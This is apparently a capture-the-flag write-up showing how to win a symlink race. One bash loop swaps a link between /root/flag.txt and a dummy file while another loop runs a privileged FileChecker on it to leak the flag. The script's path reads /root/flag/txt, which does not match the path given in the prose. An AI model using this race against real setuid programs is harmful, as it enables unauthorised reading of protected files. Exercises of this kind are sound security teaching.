We wrote two bash scripts, which we put in the home directory after sshing in. 
`redirect.sh` symlinks repeatedly between the flag at `/root/flag.txt` and a file we have permissions to (which we create in the local directory) called `dummy.txt`. 
```
while true; do
	rm link
	ln -s /root/flag/txt link
	rm link
	ln -s dummy.txt link
done
```
`runfile.sh` runs `FileChecker` repeatedly on our symlink (only printing to console when we have a flag): 
```
while true; do
	./FileChecker link | grep MCA
done
```
Now you want both of these in your same ssh session; just set `redirect.sh` to run in the background so that you can run `runfile.sh` at the same time:
```
./redirect.sh &
./runfile.sh
```